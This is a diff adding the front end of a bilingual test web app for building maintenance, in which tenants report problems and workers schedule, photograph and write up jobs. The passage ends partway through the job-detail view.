@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>MZS Field App (Test)</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible:wght@400;700&amp;display=swap">
+<style>
+:root{
+  --bg:#F2F3F5; --card:#FFFFFF; --ink:#14181F; --ink2:#4A515C; --line:#C9CED6; --soft:#E6E8EC;
+  --blue:#1F5FBF; --blue2:#174A94; --blueSoft:#DCE7F7; --onBlue:#FFFFFF;
+  --urg:#8A3A08; --urgSoft:#FBE3D2; --ok:#1E6B3A; --okSoft:#DDF0E3; --warnSoft:#FFF6F0; --warnLine:#E0A27A;
+  box-sizing:border-box; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    color-scheme:dark;
+    --bg:#0F1216; --card:#1A1F27; --ink:#EEF1F5; --ink2:#AEB6C2; --line:#3A424F; --soft:#262C36;
+    --blue:#7FA8EC; --blue2:#9DBDF2; --blueSoft:#1E2C44; --onBlue:#0F1216;
+    --urg:#F2A877; --urgSoft:#3A2416; --ok:#7FCB98; --okSoft:#17301F; --warnSoft:#2A1E16; --warnLine:#8A5A3A;
+  }
+}
+:root[data-theme="dark"]{
+  color-scheme:dark;
+  --bg:#0F1216; --card:#1A1F27; --ink:#EEF1F5; --ink2:#AEB6C2; --line:#3A424F; --soft:#262C36;
+  --blue:#7FA8EC; --blue2:#9DBDF2; --blueSoft:#1E2C44; --onBlue:#0F1216;
+  --urg:#F2A877; --urgSoft:#3A2416; --ok:#7FCB98; --okSoft:#17301F; --warnSoft:#2A1E16; --warnLine:#8A5A3A;
+}
+*,*::before,*::after{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:'Atkinson Hyperlegible',system-ui,-apple-system,'Segoe UI',sans-serif;font-size:17px;line-height:1.4}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:10;background:var(--card)}
+.wrap{max-width:480px;margin:0 auto;padding:0 16px 40px}
+header{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:var(--card);border-bottom:1px solid var(--soft)}
+.hbar{max-width:480px;margin:0 auto;padding:10px 16px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+.brand{font-weight:700;font-size:18px;margin-right:auto}
+.seg{display:inline-flex;background:var(--soft);border-radius:999px;padding:3px}
+.seg button{border:0;background:transparent;color:var(--ink2);font:inherit;font-size:15px;font-weight:700;padding:8px 14px;border-radius:999px;min-height:40px;cursor:pointer}
+.seg button[aria-pressed="true"]{background:var(--card);color:var(--ink);box-shadow:0 1px 2px rgba(0,0,0,.15)}
+h1{font-size:28px;margin:20px 0 4px}
+h2{font-size:20px;margin:24px 0 8px}
+.sub{color:var(--ink2);margin:0 0 12px}
+.card{background:var(--card);border:1px solid var(--soft);border-radius:16px;padding:16px;margin:12px 0}
+.tags{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:6px}
+.tag{font-size:12px;font-weight:700;letter-spacing:.04em;padding:3px 8px;border-radius:6px;background:var(--soft);color:var(--ink2)}
+.tag.urg{background:var(--urgSoft);color:var(--urg)}
+.tag.blue{background:var(--blueSoft);color:var(--blue2)}
+.tag.ok{background:var(--okSoft);color:var(--ok)}
+.ttl{font-weight:700;font-size:19px;margin:2px 0}
+.meta{color:var(--ink2);font-size:15px;margin:2px 0}
+.row{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;min-height:48px;padding:0 18px;border-radius:12px;border:1.5px solid var(--line);background:var(--card);color:var(--ink);font:inherit;font-weight:700;font-size:16px;cursor:pointer;text-decoration:none}
+.btn.primary{background:var(--blue);border-color:var(--blue);color:var(--onBlue)}
+.btn.ok{background:var(--ok);border-color:var(--ok);color:var(--onBlue)}
+.btn.block{width:100%}
+.btn.sm{min-height:44px;padding:0 14px;font-size:15px}
+.btn[disabled]{opacity:.55;cursor:default}
+.link{background:none;border:0;color:var(--blue);font:inherit;font-weight:700;padding:10px 0;cursor:pointer;min-height:44px}
+label{display:block;font-weight:700;margin:16px 0 6px}
+input[type=text],input[type=tel],input[type=date],select,textarea{width:100%;font:inherit;color:var(--ink);background:var(--card);border:1.5px solid var(--line);border-radius:12px;padding:12px;min-height:48px}
+textarea{min-height:110px;resize:vertical}
+input:focus,select:focus,textarea:focus,button:focus-visible,a:focus-visible{outline:3px solid var(--blue);outline-offset:2px}
+.chips{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.chips.three{grid-template-columns:1fr 1fr 1fr}
+.chip{min-height:48px;border:1.5px solid var(--line);border-radius:12px;background:var(--card);color:var(--ink);font:inherit;font-size:15px;font-weight:700;padding:8px;cursor:pointer;text-align:center}
+.chip[aria-pressed="true"]{border-color:var(--blue);background:var(--blueSoft);color:var(--blue2)}
+.alert{border-radius:12px;padding:12px 14px;margin:12px 0;background:var(--warnSoft);border:1px solid var(--warnLine);font-size:15px}
+.note{border-radius:12px;padding:12px 14px;margin:12px 0;background:var(--blueSoft);color:var(--ink);font-size:15px}
+.err{color:var(--urg);font-weight:700;font-size:15px;margin-top:8px}
+.steps{display:flex;gap:6px;margin-top:12px}
+.step{flex:1;text-align:center;font-size:13px;font-weight:700;color:var(--ink2)}
+.step .bar{height:6px;border-radius:3px;background:var(--soft);margin-bottom:4px}
+.step.on{color:var(--ink)} .step.on .bar{background:var(--blue)}
+.photos{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
+.photos img,.photos video{width:96px;height:96px;object-fit:cover;border-radius:10px;border:1px solid var(--soft);background:var(--soft)}
+.file{display:block;width:100%;padding:12px;border:1.5px dashed var(--line);border-radius:12px;font:inherit;color:var(--ink2);background:var(--card)}
+.big{font-size:22px;font-weight:700}
+.empty{text-align:center;color:var(--ink2);padding:28px 12px}
+.writeup{white-space:pre-wrap}
+.back{display:inline-flex;align-items:center;gap:4px}
+.small{font-size:13px;color:var(--ink2)}
+.testbar{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;margin:12px 0;padding:10px 12px;border-radius:12px;background:var(--blueSoft);font-size:15px}
+summary{cursor:pointer;min-height:44px;display:flex;align-items:center}
+.fbdone{opacity:.6}
+</style>
+<style type="text/css" nonce="">.redacted {
+  color: red !important;
+}</style></head>
+<body>
+<header><div class="hbar" id="hbar"></div></header>
+<main class="wrap" id="app"><p class="empty">Loading…</p></main>
+
+<script>
+(function(){
+"use strict";
+
+/* ---------- words ---------- */
+const T = {
+  en:{
+    tenant:"Tenant", worker:"Worker", loading:"Loading…",
+    reportTitle:"Report a problem", myReq:"See my requests",
+    emergency:"Fire, gas smell, or flooding? Call 911, then [MZS emergency line].",
+    building:"Building address", apt:"Apartment", phone:"Phone", yourName:"Your name",
+    whatsWrong:"What’s wrong?", tellMore:"Tell us more", tellMoreHint:"Type, or tap the mic on your phone keyboard to speak.",
+    photo:"Photo / video", bestTime:"Best time for us to come in",
+    morning:"Morning", afternoon:"Afternoon", anytime:"Anytime",
+    send:"Send to maintenance", sending:"Sending…",
+    needApt:"Please add the apartment, phone, and what’s wrong.",
+    sentTitle:"Request sent", sentBody:"Your ticket number is", sentNext:"You’ll see updates here when it’s scheduled and when it’s fixed.",
+    newReq:"+ Report a new problem", myRequests:"My requests", open:"Open", past:"Past",
+    noReq:"No requests yet.", ticket:"Ticket", sentOn:"Sent", fixedOn:"Fixed",
+    received:"Received", scheduled:"Scheduled", fixed:"Fixed", visit:"Visit",
+    reopen:"Not fixed? Reopen", reopened:"Reopened",
+    hi:"Hi", jobsToday:"open jobs", doneCount:"done",
+    openTab:"Open", doneTab:"Done", noJobs:"No open jobs. Send a test request from the Tenant tab.",
+    noDone:"Nothing finished yet.",
+    map:"Map", openJob:"Open job", flag:"+ Flag a new problem",
+    urgent:"URGENT", inProgress:"IN PROGRESS", sched:"SCHEDULED", newT:"NEW", blocked:"ON HOLD", done:"DONE",
+    back:"‹ My jobs", officeNote:"Tenant says", best:"Best time",
+    call:"Call tenant", schedule:"Schedule visit", date:"Date", slot:"Time", saveSched:"Save visit",
+    start:"Start job", started:"Started", before:"Before photo / video", after:"After photo / video",
+    notes:"Your notes", notesHint:"Type, or use your phone’s mic. Any language is fine.",
+    saveNotes:"Save notes", saved:"Saved",
+    writeup:"Write-up for the office", makeWriteup:"Write it up for the office", writing:"Writing…",
+    writeupHint:"Written from your notes, in English. You can edit it.", saveWriteup:"Save write-up",
+    markDone:"Done", couldnt:"Couldn’t finish? Pick one",
+    noAccess:"No access", needParts:"Need parts", needTrade:"Need another trade", notHome:"Tenant not home", anotherDay:"Need another day",
+    markUrgent:"Mark urgent", unmarkUrgent:"Remove urgent", del:"Delete this job", confirmDel:"Delete this job for everyone?",
+    finished:"Finished", reason:"Reason",
+    readOnly:"You can look around, but you can’t save. Ask the owner to share this with you as a Contributor.",
+    noDb:"This app needs you to be signed in to Claude to save and see jobs.",
+    saveErr:"Couldn’t save. Check your connection and try again.",
+    aiErr:"Couldn’t write it up right now. You can type it yourself.",
+    uploadErr:"Some photos didn’t upload.",
+    flaggedBy:"Flagged by worker",
+    testing:"TEST VERSION.", testingSub:"Try it out and tell us what to change.", giveFb:"Give feedback", backToApp:"‹ Back to the app",
+    fbTitle:"Feedback", fbSub:"What should we change before this goes live and connects to Airtable? Every note is saved here for the team.",
+    fbWhere:"Which screen?", fbKind:"What kind?", fbText:"Your feedback", fbNeed:"Please write your feedback.", fbThanks:"Thanks, it’s saved ✓",
+    fbSendBtn:"Send feedback", fbList:"All feedback", fbNone:"No feedback yet.", handled:"HANDLED", markHandled:"Mark handled", reopenFb:"Mark open",
+    sc_general:"General / whole app", sc_tenantForm:"Tenant: Report a problem", sc_tenantMine:"Tenant: My requests", sc_workerJobs:"Worker: Job list", sc_workerJob:"Worker: A job", sc_airtable:"Airtable fields",
+    k_bug:"Something’s broken", k_change:"Change this", k_idea:"New idea", k_missing:"Something’s missing",
+    atTitle:"Fields that will go to Airtable", atSub:"Each request becomes one Airtable record with these fields. Anything to add, rename, or drop? Send it as feedback under “Airtable fields.”",
+    cat:{heat:"No heat / hot water",leak:"Leak / water",electric:"Electric / lights",appliance:"Appliance",door:"Door / lock / window",pests:"Pests",building:"Building / hallway",other:"Something else"}
+  },
+  es:{
+    tenant:"Inquilino", worker:"Técnico", loading:"Cargando…",
+    reportTitle:"Reportar un problema", myReq:"Ver mis solicitudes",
+    emergency:"¿Fuego, olor a gas o inundación? Llame al 911 y luego a [línea de emergencia MZS].",
+    building:"Dirección del edificio", apt:"Apartamento", phone:"Teléfono", yourName:"Su nombre",
+    whatsWrong:"¿Qué pasa?", tellMore:"Cuéntenos más", tellMoreHint:"Escriba, o toque el micrófono del teclado para hablar.",
+    photo:"Foto / video", bestTime:"Mejor hora para entrar",
+    morning:"Mañana", afternoon:"Tarde", anytime:"Cualquier hora",
+    send:"Enviar a mantenimiento", sending:"Enviando…",
+    needApt:"Agregue el apartamento, el teléfono y el problema.",
+    sentTitle:"Solicitud enviada", sentBody:"Su número de ticket es", sentNext:"Verá aquí cuando esté programado y cuando esté arreglado.",
+    newReq:"+ Reportar otro problema", myRequests:"Mis solicitudes", open:"Abiertas", past:"Anteriores",
+    noReq:"Todavía no hay solicitudes.", ticket:"Ticket", sentOn:"Enviado", fixedOn:"Arreglado",
+    received:"Recibido", scheduled:"Programado", fixed:"Arreglado", visit:"Visita",
+    reopen:"¿No se arregló? Reabrir", reopened:"Reabierto",
+    hi:"Hola", jobsToday:"trabajos abiertos", doneCount:"hechos",
+    openTab:"Abiertos", doneTab:"Hechos", noJobs:"No hay trabajos abiertos. Envíe una prueba desde Inquilino.",
+    noDone:"Nada terminado todavía.",
+    map:"Mapa", openJob:"Abrir trabajo", flag:"+ Reportar un problema nuevo",
+    urgent:"URGENTE", inProgress:"EN CURSO", sched:"PROGRAMADO", newT:"NUEVO", blocked:"EN PAUSA", done:"HECHO",
+    back:"‹ Mis trabajos", officeNote:"El inquilino dice", best:"Mejor hora",
+    call:"Llamar al inquilino", schedule:"Programar visita", date:"Fecha", slot:"Hora", saveSched:"Guardar visita",
+    start:"Empezar trabajo", started:"Empezó", before:"Foto / video antes", after:"Foto / video después",
+    notes:"Sus notas", notesHint:"Escriba o use el micrófono. Cualquier idioma.",
+    saveNotes:"Guardar notas", saved:"Guardado",
+    writeup:"Reporte para la oficina", makeWriteup:"Hacer reporte para la oficina", writing:"Escribiendo…",
+    writeupHint:"Hecho de sus notas, en inglés. Puede editarlo.", saveWriteup:"Guardar reporte",
+    markDone:"Hecho", couldnt:"¿No pudo terminar? Elija uno",
+    noAccess:"Sin acceso", needParts:"Faltan piezas", needTrade:"Otro oficio", notHome:"Inquilino no está", anotherDay:"Otro día",
+    markUrgent:"Marcar urgente", unmarkUrgent:"Quitar urgente", del:"Borrar este trabajo", confirmDel:"¿Borrar este trabajo para todos?",
+    finished:"Terminado", reason:"Motivo",
+    readOnly:"Puede mirar, pero no guardar. Pida al dueño acceso de Colaborador.",
+    noDb:"Necesita iniciar sesión en Claude para guardar y ver trabajos.",
+    saveErr:"No se pudo guardar. Revise la conexión e intente otra vez.",
+    aiErr:"No se pudo escribir el reporte ahora. Puede escribirlo usted.",
+    uploadErr:"Algunas fotos no se subieron.",
+    flaggedBy:"Reportado por técnico",
+    cat:{heat:"Sin calefacción / agua caliente",leak:"Fuga / agua",electric:"Electricidad / luces",appliance:"Electrodoméstico",door:"Puerta / cerradura / ventana",pests:"Plagas",building:"Edificio / pasillo",other:"Otra cosa"}
+  }
+};
+const CATS=["heat","leak","electric","appliance","door","pests","building","other"];
+const BLOCKS=["noAccess","needParts","needTrade","notHome","anotherDay"];
+
+/* ---------- state ---------- */
+const S={
+  lang:"en", role:"tenant", view:"form", jobs:[], loaded:false, jobId:null,
+  me:null, myName:"", db:null, assets:null, sample:null, readOnly:false, noDb:false,
+  draft:{building:"",apt:"",phone:"",name:"",category:"",details:"",timePref:"anytime"},
+  files:[], sending:false, formErr:"", lastTicket:"", fromWorker:false,
+  workerTab:"open", notes:{}, writeups:{}, sched:{}, busy:{}, flash:{}, err:{},
+  fb:[], fbDraft:{screen:"general",kind:"change",text:""}, fbSending:false, fbErr:"", fbSent:false, prevView:null
+};
+const store={
+  get(k){try{return localStorage.getItem(k)}catch(e){return null}},
+  set(k,v){try{localStorage.setItem(k,v)}catch(e){}}
+};
+S.lang = store.get("mzs-lang")==="es" ? "es" : "en";
+S.role = store.get("mzs-role")==="worker" ? "worker" : "tenant";
+S.view = S.role==="worker" ? "jobs" : "form";
+let mine=[]; try{mine=JSON.parse(store.get("mzs-mine")||"[]")}catch(e){mine=[]}
+
+const t=k=>T[S.lang][k]??T.en[k]??k;
+const catName=c=>(T[S.lang].cat[c]||T.en.cat[c]||c);
+const esc=s=>String(s??"").replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+const fmtTime=ms=>ms?new Date(ms).toLocaleTimeString(S.lang==="es"?"es-US":"en-US",{hour:"numeric",minute:"2-digit"}):"";
+const fmtDate=ms=>ms?new Date(ms).toLocaleDateString(S.lang==="es"?"es-US":"en-US",{month:"short",day:"numeric"}):"";
+const fmtVisit=v=>{ if(!v||!v.date) return ""; const d=new Date(v.date+"T12:00:00"); return d.toLocaleDateString(S.lang==="es"?"es-US":"en-US",{weekday:"short",month:"short",day:"numeric"})+" · "+t(v.slot||"anytime"); };
+const blob=id=>"/_blob/"+encodeURIComponent(id);
+
+/* ---------- rendering ---------- */
+let pending=false;
+function isTyping(){const a=document.activeElement;return a&&(a.tagName==="TEXTAREA"||(a.tagName==="INPUT"&&a.type!=="file"))}
+function soft(){ if(isTyping()){pending=true;return} render(); }
+document.addEventListener("focusout",()=>{ if(pending){pending=false;setTimeout(()=>{ if(!isTyping()) render(); else pending=true; },0)} });
+
+function header(){
+  document.getElementById("hbar").innerHTML=
+    `<span class="brand">MZS</span>
+     <div class="seg" role="group" aria-label="View as">
+       <button data-act="role" data-v="tenant" aria-pressed="${S.role==="tenant"}">${t("tenant")}</button>
+       <button data-act="role" data-v="worker" aria-pressed="${S.role==="worker"}">${t("worker")}</button>
+     </div>
+     <div class="seg" role="group" aria-label="Language">
+       <button data-act="lang" data-v="en" aria-pressed="${S.lang==="en"}">EN</button>
+       <button data-act="lang" data-v="es" aria-pressed="${S.lang==="es"}">ES</button>
+     </div>`;
+  document.documentElement.lang=S.lang;
+}
+function banners(){
+  let h=S.view==="feedback"?"":`<div class="testbar"><span><b>${t("testing")}</b> ${t("testingSub")}</span><button class="btn sm primary" data-act="toFb">${t("giveFb")}</button></div>`;
+  if(S.noDb) h+=`<div class="alert">${t("noDb")}</div>`;
+  else if(S.readOnly) h+=`<div class="alert">${t("readOnly")}</div>`;
+  return h;
+}
+function render(){
+  header();
+  const app=document.getElementById("app");
+  let h=banners();
+  if(S.view==="form") h+=vForm();
+  else if(S.view==="sent") h+=vSent();
+  else if(S.view==="mine") h+=vMine();
+  else if(S.view==="jobs") h+=vJobs();
+  else if(S.view==="job") h+=vJob();
+  else if(S.view==="feedback") h+=vFeedback();
+  app.innerHTML=h;
+}
+
+function chip(act,v,on,label){return `<button type="button" class="chip" data-act="${act}" data-v="${v}" aria-pressed="${on}">${esc(label)}</button>`}
+
+function vForm(){
+  const d=S.draft;
+  return `
+  ${S.fromWorker?`<button class="link back" data-act="toJobs">${t("back")}</button>`:""}
+  <h1>${t("reportTitle")}</h1>
+  ${S.fromWorker?"":`<button class="link" data-act="toMine">${t("myReq")} ›</button>`}
+  <div class="alert">${t("emergency")}</div>
+  <label for="f-building">${t("building")}</label>
+  <input id="f-building" type="text" data-f="building" value="${esc(d.building)}" autocomplete="street-address">
+  <label for="f-apt">${t("apt")}</label>
+  <input id="f-apt" type="text" data-f="apt" value="${esc(d.apt)}">
+  <label for="f-phone">${t("phone")}</label>
+  <input id="f-phone" type="tel" data-f="phone" value="${esc(d.phone)}" autocomplete="tel">
+  <label for="f-name">${t("yourName")}</label>
+  <input id="f-name" type="text" data-f="name" value="${esc(d.name)}" autocomplete="name">
+  <label id="l-cat">${t("whatsWrong")}</label>
+  <div class="chips" role="group" aria-labelledby="l-cat">${CATS.map(c=>chip("cat",c,d.category===c,catName(c))).join("")}</div>
+  <label for="f-details">${t("tellMore")}</label>
+  <p class="small" style="margin:0 0 6px">${t("tellMoreHint")}</p>
+  <textarea id="f-details" data-f="details">${esc(d.details)}</textarea>
+  ${S.assets?`<label for="f-files">${t("photo")}</label>
+  <input id="f-files" class="file" type="file" accept="image/*,video/*" multiple data-act="pickFiles">
+  ${S.files.length?`<p class="small">${S.files.length} ✓</p>`:""}`:""}
+  <label id="l-time">${t("bestTime")}</label>
+  <div class="chips three" role="group" aria-labelledby="l-time">${["morning","afternoon","anytime"].map(x=>chip("time",x,d.timePref===x,t(x))).join("")}</div>
+  ${S.formErr?`<p class="err" role="alert">${esc(S.formErr)}</p>`:""}
+  <div style="margin-top:20px"><button class="btn primary block" data-act="send" ${S.sending||S.readOnly||S.noDb?"disabled":""}>${S.sending?t("sending"):t("send")}</button></div>`;
+}
+function vSent(){
+  return `<div class="card" style="margin-top:24px">
+    <p class="ttl">${t("sentTitle")} ✓</p>
+    <p>${t("sentBody")} <span class="big">#${esc(S.lastTicket)}</span></p>
+    <p class="meta">${t("sentNext")}</p>
+    <div class="row"><button class="btn primary" data-act="toMine">${t("myRequests")}</button>
+    <button class="btn" data-act="newForm">${t("newReq")}</button></div></div>`;
+}
+function stepsHtml(j){
+  const lvl = j.status==="done"?3 : (j.status==="scheduled"||j.status==="in_progress"||(j.status==="blocked"&&j.visit))?2 : 1;
+  return `<div class="steps">${["received","scheduled","fixed"].map((s,i)=>`<div class="step ${i<lvl?"on":""}"><div class="bar"></div>${t(s)}</div>`).join("")}</div>`;
+}
+function myJobs(){ return S.jobs.filter(j=>(S.me&&j.createdBy===S.me)||mine.includes(j.id)); }
+function vMine(){
+  const list=myJobs().filter(j=>!j.byWorker).sort((a,b)=>(b.createdAt||0)-(a.createdAt||0));
+  const open=list.filter(j=>j.status!=="done"), past=list.filter(j=>j.status==="done");
+  const card=j=>`<div class="card">
+    <div class="tags">${j.status==="done"?`<span class="tag ok">${t("fixed").toUpperCase()}</span>`:""}${j.reopened&&j.status!=="done"?`<span class="tag">${t("reopened").toUpperCase()}</span>`:""}</div>
+    <p class="ttl">${esc(catName(j.category))}</p>
+    <p class="meta">${t("ticket")} #${esc(j.ticket)} · ${j.status==="done"?t("fixedOn")+" "+fmtDate(j.finishedAt):t("sentOn")+" "+fmtDate(j.createdAt)}</p>
+    ${j.status!=="done"?stepsHtml(j):""}
+    ${j.visit&&j.status!=="done"?`<p class="meta" style="margin-top:10px"><b>${t("visit")}:</b> ${esc(fmtVisit(j.visit))}</p>`:""}
+    ${j.status==="done"&&j.afterPhotos&&j.afterPhotos.length?`<div class="photos">${photoHtml(j.afterPhotos)}</div>`:""}
+    ${j.status==="done"?`<div class="row"><button class="btn sm" data-act="reopen" data-id="${esc(j.id)}" ${S.readOnly?"disabled":""}>${t("reopen")}</button></div>`:""}
+  </div>`;
+  return `<button class="link back" data-act="newForm">‹ ${t("reportTitle")}</button>
+  <h1>${t("myRequests")}</h1>
+  ${!S.loaded?`<p class="empty">${t("loading")}</p>`:!list.length?`<p class="empty">${t("noReq")}</p>`:""}
+  ${open.length?`<h2>${t("open")}</h2>${open.map(card).join("")}`:""}
+  ${past.length?`<h2>${t("past")}</h2>${past.map(card).join("")}`:""}
+  <div style="margin-top:16px"><button class="btn primary block" data-act="newForm">${t("newReq")}</button></div>`;
+}
+function photoHtml(ids){
+  return (ids||[]).map(p=>{const id=typeof p==="string"?p:p.id; const vid=typeof p==="object"&&/^video/.test(p.type||"");
+    return vid?`<video src="${blob(id)}" controls playsinline preload="metadata"></video>`:`<a href="${blob(id)}" target="_blank" rel="noopener"><img src="${blob(id)}" alt=""></a>`}).join("");
+}
+const RANK={in_progress:0,scheduled:1,received:2,blocked:3};
+function tagsFor(j){
+  let h="";
+  if(j.urgent) h+=`<span class="tag urg">${t("urgent")}</span>`;
+  if(j.status==="in_progress") h+=`<span class="tag blue">${t("inProgress")}</span>`;
+  else if(j.status==="scheduled") h+=`<span class="tag blue">${t("sched")}</span>`;
+  else if(j.status==="received") h+=`<span class="tag">${t("newT")}</span>`;
+  else if(j.status==="blocked") h+=`<span class="tag urg">${t("blocked")}: ${esc(t(j.blockReason))}</span>`;
+  else if(j.status==="done") h+=`<span class="tag ok">${t("done")}</span>`;
+  return h;
+}
+function mapUrl(j){return "https://www.google.com/maps/search/?api=1&query="+encodeURIComponent(j.building||"")}
+function vJobs(){
+  const open=S.jobs.filter(j=>j.status!=="done").sort((a,b)=>(b.urgent?1:0)-(a.urgent?1:0)||(RANK[a.status]??9)-(RANK[b.status]??9)||(a.createdAt||0)-(b.createdAt||0));
+  const done=S.jobs.filter(j=>j.status==="done").sort((a,b)=>(b.finishedAt||0)-(a.finishedAt||0));
+  const list=S.workerTab==="open"?open:done;
+  const card=(j,i)=>`<div class="card">
+    <div class="tags">${tagsFor(j)}</div>
+    <p class="ttl">${S.workerTab==="open"?(i+1)+". ":""}${esc(catName(j.category))}</p>
+    <p class="meta">${esc(j.building||"[Building address]")} · ${t("apt")} ${esc(j.apt)}</p>
+    ${j.visit&&j.status!=="done"?`<p class="meta">${t("visit")}: ${esc(fmtVisit(j.visit))}</p>`:j.timePref?`<p class="meta">${t("best")}: ${t(j.timePref)}</p>`:""}
+    <div class="row">${j.building?`<a class="btn sm" href="${mapUrl(j)}" target="_blank" rel="noopener">${t("map")}</a>`:""}
+    <button class="btn sm primary" data-act="openJob" data-id="${esc(j.id)}">${t("openJob")}</button></div></div>`;
+  return `<h1>${t("hi")}${S.myName?" "+esc(S.myName.split(" ")[0]):""}</h1>
+  <p class="sub">${open.length} ${t("jobsToday")} · ${done.length} ${t("doneCount")}</p>
+  <div class="seg" role="group" aria-label="Jobs">
+    <button data-act="wtab" data-v="open" aria-pressed="${S.workerTab==="open"}">${t("openTab")} (${open.length})</button>
+    <button data-act="wtab" data-v="done" aria-pressed="${S.workerTab==="done"}">${t("doneTab")} (${done.length})</button>
+  </div>
+  ${!S.loaded?`<p class="empty">${t("loading")}</p>`:!list.length?`<p class="empty">${S.workerTab==="open"?t("noJobs"):t("noDone")}</p>`:list.map(card).join("")}
+  <div style="margin-top:16px"><button class="btn block" data-act="flag" ${S.readOnly||S.noDb?"disabled":""}>${t("flag")}</button></div>`;
+}
+function vJob(){
+  const j=S.jobs.find(x=>x.id===S.jobId);
+  if(!j) return `<button class="link back" data-act="toJobs">${t("back")}</button><p class="empty">${S.loaded?"—":t("loading")}</p>`;
+  const id=j.id, busy=k=>S.busy[id+k], ro=S.readOnly?"disabled":"";
+  const notes=S.notes[id]??(j.notes||""), wu=S.writeups[id]??(j.writeup||"");
+  const sc=S.sched[id]||{date:(j.visit&&j.visit.date)||new Date().toISOString().slice(0,10),slot:(j.visit&&j.visit.slot)||j.timePref||"anytime"};
+  const done=j.status==="done";
+  return `<button class="link back" data-act="toJobs">${t("back")}</button>
+  <div class="tags" style="margin-top:4px">${tagsFor(j)}${j.byWorker?`<span class="tag">${t("flaggedBy").toUpperCase()}</span>`:""}</div>
+  <h1 style="margin-top:4px">${esc(catName(j.category))}</h1>
+  <p class="sub">${esc(j.building||"[Building address]")} · ${t("apt")} ${esc(j.apt)} · ${t("ticket")} #${esc(j.ticket)}</p>
+  <div class="card">
+    ${j.details?`<p class="meta"><b>${t("officeNote")}:</b> ${esc(j.details)}</p>`:""}
+    <p class="meta"><b>${t("best")}:</b> ${t(j.timePref||"anytime")}${j.name?` · ${esc(j.name)}`:""}</p>
+    ${j.photos&&j.photos.length?`<div class="photos">${photoHtml(j.photos)}</div>`:""}
+    <div class="row">${j.phone?`<a class="btn sm" href="tel:${esc(String(j.phone).replace(/[^\d+]/g,""))}">${t("call")}</a>`:""}
+    ${j.building?`<a class="btn sm" href="${mapUrl(j)}" target="_blank" rel="noopener">${t("map")}</a>`:""}
+    <button class="btn sm" data-act="urgent" data-id="${esc(id)}" ${ro}>${j.urgent?t("unmarkUrgent"):t("markUrgent")}</button></div>
+  </div>
+
+  ${done?`<div class="card"><p class="ttl" style="color:var(--ok)">${t("finished")} ${fmtDate(j.finishedAt)} ${fmtTime(j.finishedAt)}</p>${j.startedAt?`<p class="meta">${t("started")} ${fmtTime(j.startedAt)}</p>`:""}</div>`:`
+  <div class="card">
+    <p class="ttl">${t("schedule")}</p>
+    <div class="row" style="margin-top:4px">
+      <div style="flex:1;min-width:140px"><label for="s-date" style="margin-top:0">${t("date")}</label><input id="s-date" type="date" data-sched="date" data-id="${esc(id)}" value="${esc(sc.date)}"></div>
+      <div style="flex:1;min-width:120px"><label for="s-slot" style="margin-top:0">${t("slot")}</label><select id="s-slot" data-sched="slot" data-id="${esc(id)}">${["morning","afternoon","anytime"].map(x=>`<option value="${x}" ${sc.slot===x?"selected":""}>${t(x)}</option>`).join("")}</select></div>
+    </div>
+    <div class="row"><button class="btn sm" data-act="saveSched" data-id="${esc(id)}" ${ro}>${S.flash[id+"s"]?t("saved")+" ✓":t("saveSched")}</button></div>
+  </div>
+  <div class="card">
+    ${j.startedAt?`<p class="meta">${t("started")}</p><p class="big" style="margin:0">${fmtTime(j.startedAt)}</p>`:`<button class="btn primary block" data-act="start" data-id="${esc(id)}" ${ro}>${t("start")}</button>`}
+  </div>`}
+
+  <div class="card">
+    <p class="ttl">${t("before")}</p>
+    <div class="photos">${photoHtml(j.beforePhotos)}</div>
+    ${S.assets&&!done?`<input class="file" style="margin-top:8px" type="file" accept="image/*,video/*" capture="environment" multiple data-act="jobPhoto" data-id="${esc(id)}" data-k="beforePhotos" aria-label="${t("before")}" ${ro}>`:""}
+    ${busy("beforePhotos")?`<p class="small">${t("sending")}</p>`:""}
+    <p class="ttl" style="margin-top:16px">${t("after")}</p>
+    <div class="photos">${photoHtml(j.afterPhotos)}</div>
+    ${S.assets&&!done?`<input class="file" style="margin-top:8px" type="file" accept="image/*,video/*" capture="environment" multiple data-act="jobPhoto" data-id="${esc(id)}" data-k="afterPhotos" aria-label="${t("after")}" ${ro}>`:""}
+    ${busy("afterPhotos")?`<p class="small">${t("sending")}</p>`:""}
+  </div>
+
+  <div class="card">
+    <label for="j-notes" style="margin-top:0">${t("notes")}</label>
+    <p class="small" style="margin:0 0 6px">${t("notesHint")}</p>
+    <textarea id="j-notes" data-notes="${esc(id)}">${esc(notes)}</textarea>
+    <div class="row"><button class="btn sm" data-act="saveNotes" data-id="${esc(id)}" ${ro}>${S.flash[id+"n"]?t("saved")+" ✓":t("saveNotes")}</button>
+    ${S.sample?`<button class="btn sm primary" data-act="ai" data-id="${esc(id)}" ${busy("ai")||S.readOnly?"disabled":""}>${busy("ai")?t("writing"):t("makeWriteup")}</button>`:""}</div>
+    ${(wu||busy("ai"))?`<label for="j-wu">${t("writeup")}</label><p class="small" style="margin:0 0 6px">${t("writeupHint")}</p>
+    <textarea id="j-wu" data-wu="${esc(id)}" style="min-height:140px">${esc(wu)}</textarea>
+    <div class="row"><button class="btn sm" data-act="saveWu" data-id="${esc(id)}" ${ro}>${S.flash[id+"w"]?t("saved")+" ✓":t("saveWriteup")}</button></div>`:""}
+    ${S.err[id]?`<p class="err" role="alert">${esc(S.err[id])}</p>`:""}
+  </div>
+
